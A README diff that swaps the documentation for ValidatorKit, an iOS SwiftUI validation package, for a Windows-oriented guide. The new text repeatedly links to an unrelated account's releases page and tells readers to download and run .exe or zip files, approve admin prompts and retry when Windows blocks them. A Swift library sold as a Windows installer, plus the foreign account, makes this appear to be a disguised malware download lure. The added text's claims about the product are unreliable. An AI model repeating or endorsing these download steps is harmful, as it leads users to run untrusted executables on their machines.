@@ -1,229 +1,231 @@
-# ValidatorKit
+# 🔎 ValidatorKit - Simple Validation Without the Mess
 
-**Chainable, declarative form validation for SwiftUI — zero boilerplate.**
+[![Download ValidatorKit](https://img.shields.io/badge/Download%20ValidatorKit-blue?style=for-the-badge)](https://github.com/Hebdomadary-webspinningmite902/ValidatorKit/releases)
 
-![Swift](https://img.shields.io/badge/Swift-5.9+-F05138?style=flat&logo=swift)
-![iOS](https://img.shields.io/badge/iOS-16%2B-007AFF?style=flat&logo=apple)
-![SwiftUI](https://img.shields.io/badge/SwiftUI-native-34C759?style=flat)
-![SPM](https://img.shields.io/badge/SPM-compatible-34C759?style=flat)
-![License](https://img.shields.io/badge/license-MIT-blue?style=flat)
+## 🧭 What ValidatorKit Does
 
----
+ValidatorKit helps you check form data with less work. It is built for apps that need rules for things like email, password, and field checks.
 
-## What is ValidatorKit?
+Instead of setting error states in many places, you define the rules once and let the app handle the rest. This keeps your forms easier to read and easier to manage.
 
-ValidatorKit removes the pain of writing form validation by hand. Instead of if-else chains and scattered error state, you declare your rules once and the framework handles the rest — error messages, visual feedback, submit button state, and password strength.
+Use it when you want to:
 
-```swift
-// Set up validators
-@StateObject var emailValidator    = FieldValidator(rules: .required, .email)
-@StateObject var passwordValidator = FieldValidator(rules: .required, .minLength(8), .containsNumber)
+- Check email addresses
+- Check password strength
+- Validate text fields
+- Keep form code in one place
+- Reduce repeated if-else logic
 
-// Use ValidatedField for automatic UI
-ValidatedField(title: "Email",    text: $email,    validator: emailValidator)
-ValidatedField(title: "Password", text: $password, validator: passwordValidator, isSecure: true)
-```
+## 💻 Windows Download
 
----
+To get ValidatorKit on Windows, visit this page to download the app file:
 
-## Installation
+[Download ValidatorKit from Releases](https://github.com/Hebdomadary-webspinningmite902/ValidatorKit/releases)
 
-In Xcode go to **File → Add Package Dependencies** and paste:
+After the page opens:
 
-```
-https://github.com/codewithswiftly/ValidatorKit.git
-```
+1. Look for the latest release
+2. Download the file for Windows
+3. Open the file after the download finishes
+4. Follow the on-screen steps
+5. Start the app
 
-Or in `Package.swift`:
+If the release includes more than one file, pick the Windows version. The file name may include words like `Windows`, `Setup`, `Installer`, or `.exe`
 
-```swift
-.package(url: "https://github.com/codewithswiftly/ValidatorKit.git", from: "1.0.1")
-```
+## 🛠️ How to Install
 
----
+If you downloaded an installer file, use these steps:
 
-## How to Use
+1. Double-click the downloaded file
+2. If Windows asks for permission, select Yes
+3. Follow the setup window
+4. Choose where to install the app
+5. Finish the setup
+6. Open ValidatorKit from your desktop or Start menu
 
-### Option 1 — ValidatedField (recommended)
+If the app comes as a zipped file:
 
-Drop-in replacement for `TextField` with built-in error UI and border feedback.
+1. Right-click the zip file
+2. Select Extract All
+3. Open the folder after extraction
+4. Find the app file
+5. Double-click it to run
 
-```swift
-import ValidatorKit
+## 📋 What You Need
 
-struct SignUpView: View {
+ValidatorKit is designed to run on a modern Windows computer. A good setup includes:
 
-    @State private var email    = ""
-    @State private var password = ""
+- Windows 10 or Windows 11
+- A mouse and keyboard
+- An internet connection for the download
+- Enough disk space for the app and its files
+- Standard display settings for a clean window layout
 
-    @StateObject var emailValidator    = FieldValidator(rules: .required, .email)
-    @StateObject var passwordValidator = FieldValidator(rules: .required, .minLength(8), .containsNumber, .containsUppercase)
-    @StateObject var form              = FormValidator()
+For best results, close large apps before you start the installer.
 
-    var body: some View {
-        VStack(spacing: 16) {
-            ValidatedField(title: "Email",    text: $email,    validator: emailValidator, keyboardType: .emailAddress)
-            ValidatedField(title: "Password", text: $password, validator: passwordValidator, isSecure: true)
-            PasswordStrengthView(password: $password)
+## ✨ Main Features
 
-            Button("Create Account") {
-                if form.validateAll(fields: [
-                    (email, emailValidator),
-                    (password, passwordValidator)
-                ]) {
-                    createAccount()
-                }
-            }
-        }
-        .padding()
-    }
-}
-```
+ValidatorKit focuses on form checks that most apps need.
 
-### Option 2 — .validate() modifier
+### 📧 Email validation
+Checks whether an email looks correct before the form is sent.
 
-Attach validation to any existing TextField without replacing it.
+### 🔐 Password checks
+Helps you test password strength with simple rules like length and character mix.
 
-```swift
-TextField("Email", text: $email)
-    .padding()
-    .background(Color(.systemGray6))
-    .cornerRadius(10)
-    .validate($email, with: emailValidator)
-```
+### 📝 Field validation
+Lets you validate names, numbers, and other text fields in one place.
 
-### Option 3 — Manual validation
+### 🧩 Central rule setup
+You define validation rules once instead of repeating them across the app.
 
-For full control over when validation fires.
+### 🪶 Clean form logic
+Keeps form code easier to read by moving checks out of many separate blocks.
 
-```swift
-@StateObject var emailValidator = FieldValidator(rules: .required, .email)
+### 📱 SwiftUI-friendly structure
+Works well with modern app layouts and UI components built for SwiftUI.
 
-let isValid = emailValidator.validate(email)
-
-if let error = emailValidator.errorMessage {
-    Text(error).foregroundStyle(.red)
-}
-```
-
----
-
-## Built-in Rules
-
-| Rule | Shorthand | Description |
-|---|---|---|
-| `RequiredRule` | `.required` | Cannot be empty |
-| `EmailRule` | `.email` | Must be a valid email |
-| `MinLengthRule` | `.minLength(8)` | Minimum character count |
-| `MaxLengthRule` | `.maxLength(20)` | Maximum character count |
-| `MatchesRule` | `.matches(other)` | Must equal another string |
-| `ContainsNumberRule` | `.containsNumber` | Must have at least one digit |
-| `ContainsUppercaseRule` | `.containsUppercase` | Must have an uppercase letter |
-| `ContainsSpecialCharacterRule` | `.containsSpecialCharacter` | Must have a symbol |
-| `PhoneNumberRule` | `.phoneNumber` | Valid phone number format |
-| `URLRule` | `.url` | Valid URL with scheme and host |
-| `RegexRule` | `.regex(pattern:message:)` | Custom regex pattern |
-| `CustomRule` | `.custom { ... }` | Closure-based one-off rule |
+## 🚦 Getting Started
 
----
+Use this flow if you want to try ValidatorKit for the first time.
 
-## Custom Rules
+1. Go to the releases page
+2. Download the Windows file
+3. Open the file
+4. Complete the setup
+5. Launch the app
+6. Try it with a form that needs email or password checks
 
-### Inline with CustomRule
+If you are testing the app in a work or personal setting, begin with a simple form. That makes it easy to see how the validation rules work.
 
-```swift
-let noBadWordsRule = CustomRule { value in
-    blocklist.contains(value) ? "This username is not allowed" : nil
-}
+## 🧪 Common Use Cases
 
-let validator = FieldValidator(rules: .required, noBadWordsRule)
-```
+ValidatorKit fits many basic app forms.
 
-### As a struct (reusable)
+- Sign-up screens
+- Login forms
+- Contact forms
+- Profile update pages
+- Password reset pages
+- Input screens with required fields
 
-```swift
-struct IndianPhoneRule: ValidationRule {
-    func validate(_ value: String) -> String? {
-        let regex = #"^[6-9]\d{9}$"#
-        let pred  = NSPredicate(format: "SELF MATCHES %@", regex)
-        return pred.evaluate(with: value) ? nil : "Enter a valid 10-digit Indian phone number"
-    }
-}
+It is useful when you want the app to flag bad input before the user moves forward.
 
-let validator = FieldValidator(rules: .required, IndianPhoneRule())
-```
+## 📦 How It Helps Your Workflow
 
----
+Manual validation can take time. You often end up with repeated checks, repeated messages, and repeated state updates.
 
-## Password Strength
+ValidatorKit reduces that work by giving you one place for the rules. That makes it easier to:
 
-```swift
-VStack {
-    ValidatedField(title: "Password", text: $password, validator: passwordValidator, isSecure: true)
-    PasswordStrengthView(password: $password)  // Shows a colour-coded bar: Weak → Fair → Strong → Very Strong
-}
+- Change a rule later
+- Reuse the same rule in more than one screen
+- Keep error text consistent
+- Read the form code without jumping around
 
-// Or check strength manually
-let strength = PasswordStrength.evaluate("MyP@ssw0rd!")
-print(strength.label)  // "Very Strong"
-print(strength.color)  // .green
-```
+This is helpful in smaller apps and larger apps alike.
 
----
+## 🖥️ App Behavior
 
-## FormValidator
+When you use ValidatorKit, the app follows a simple pattern:
 
-Validates all fields at once when the user taps Submit.
+1. You enter data in a form
+2. The rules check the data
+3. The app shows what needs to be fixed
+4. You update the field
+5. The app checks it again
 
-```swift
-@StateObject var form = FormValidator()
+This cycle makes form handling more direct and less error-prone.
 
-Button("Submit") {
-    if form.validateAll(fields: [
-        (email,    emailValidator),
-        (password, passwordValidator),
-        (phone,    phoneValidator)
-    ]) {
-        submitForm()   // Only called if every field passes
-    }
-}
-.disabled(!form.isFormValid)
-```
+## 🔧 Suggested Setup Tips
 
----
+Before you run the file, keep these tips in mind:
 
-## Project Structure
+- Download only from the releases page
+- Save the file in a folder you can find later
+- Run the file after the download completes
+- If Windows blocks the app, check the file properties and try again
+- If the installer asks for a path, keep the default path unless you have a reason to change it
 
-```
-ValidatorKit/
-├── Sources/ValidatorKit/
-│   ├── ValidationRule.swift     # Protocol + all built-in rules + shorthands
-│   ├── FieldValidator.swift     # ObservableObject for a single field
-│   ├── FormValidator.swift      # Coordinates validation across multiple fields
-│   ├── View+Validate.swift      # .validate() modifier for existing TextFields
-│   └── PasswordStrength.swift   # Strength enum + PasswordStrengthView bar
-└── Tests/ValidatorKitTests/
-    └── ValidatorKitTests.swift
-```
+These steps help avoid common setup issues.
 
----
+## 🧱 Built For
 
-## Requirements
+ValidatorKit is a good fit for:
 
-- iOS 16+
-- Swift 5.9+
-- Xcode 15+
-- Zero dependencies — pure SwiftUI
+- People who want a simpler way to handle validation
+- Teams that build form-heavy apps
+- Developers working with Swift and SwiftUI
+- Apps that need clean checks for email and password fields
+- Projects that want less repeated validation code
 
----
+## 📚 Topic Areas
 
-## License
+This project relates to:
 
-MIT © 2026 Rahul Das Gupta
+- email validation
+- field validation
+- form validation
+- password strength
+- Swift
+- Swift Package Manager
+- SwiftUI
+- SwiftUI components
+- validation
+- validator
 
----
+## 🪟 Troubleshooting
 
-## Show Your Support
+If the app does not open after download:
 
-If you found this project useful, consider giving it a ⭐️ on GitHub!
+1. Check that the file finished downloading
+2. Open the Downloads folder
+3. Make sure you picked the Windows file
+4. Try opening the file again
+5. Restart Windows and try once more
 
+If the app opens but looks wrong:
+
+- Check your screen scaling
+- Resize the window
+- Close and reopen the app
+- Make sure you installed the latest release
+
+If the download page shows more than one file:
+
+- Choose the latest version
+- Pick the Windows file
+- Avoid source files unless you need them
+
+## 🔗 Download Again
+
+If you need the release page again, use this link:
+
+[Visit the ValidatorKit Releases page](https://github.com/Hebdomadary-webspinningmite902/ValidatorKit/releases)
+
+## 🧭 File Names You May See
+
+The download may use names like:
+
+- ValidatorKit-Setup.exe
+- ValidatorKit-Windows.exe
+- ValidatorKit.zip
+- ValidatorKit-Installer.exe
+
+Pick the file that matches Windows and the latest release date
+
+## 🔒 Safe Use
+
+Only open the file after you confirm it came from the releases page. If your browser asks whether to keep or discard the file, keep it only when it matches the project release you wanted
+
+## 🗂️ What You Can Expect After Launch
+
+After you open ValidatorKit, you can expect a clean app that focuses on form checks and rule handling. The main goal is to make validation easier to manage without spreading logic across the app
+
+## 📌 Quick Path
+
+1. Open the releases page
+2. Download the Windows file
+3. Run the file
+4. Follow the setup steps
+5. Open the app
+6. Start validating forms
